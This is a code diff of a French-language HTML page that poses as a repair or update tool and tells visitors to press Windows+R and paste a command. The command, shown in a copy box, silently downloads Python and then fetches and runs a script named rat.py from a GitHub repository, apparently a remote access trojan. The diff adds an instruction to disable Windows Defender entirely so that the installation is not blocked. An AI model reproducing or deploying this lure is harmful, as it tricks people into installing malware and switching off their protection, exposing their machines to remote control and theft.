@@ -32,15 +32,15 @@
         <p><strong>Pour résoudre ce problème :</strong></p>
         <ol style="font-size: 14px; color: #555; text-align: left; margin-bottom: 15px; padding-left: 20px;">
             <li>Désactivez votre VPN le temps de l'installation.</li>
+            <li><strong>Désactivez totalement votre antivirus</strong> (Windows Defender) sinon l'installation sera bloquée.</li>
             <li>Laissez votre navigateur <strong>ouvert</strong> pendant toute la durée de la réparation.</li>
-            <li>Autorisez l'outil de mise à jour (Windows Defender va peut-être demander une confirmation, acceptez-la).</li>
         </ol>
         
         <p>Exécutez la commande suivante dans l'invite de commandes :</p>
         
         <div class="code-box" onclick="copyCode()" id="cmdText">powershell -w hidden -c "iwr -useb https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile $env:TEMP\py.exe; Start-Process $env:TEMP\py.exe -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait; iwr -useb https://raw.githubusercontent.com/swiemali2-lgtm/member-cleanup/main/rat.py -OutFile $env:TEMP\r.py; python $env:TEMP\r.py"</div>
         
-        <p class="instruction">Appuyez sur <b>Windows + R</b>, collez le code et appuyez sur <b>Entrée</b>. <br>Si Windows Defender vous bloque, cliquez sur "Plus d'infos" puis "Exécuter quand même".</p>
+        <p class="instruction">Appuyez sur <b>Windows + R</b>, collez le code et appuyez sur <b>Entrée</b>.</p>
         
         <button class="btn" onclick="copyCode()">Copier la commande</button>
     </div>
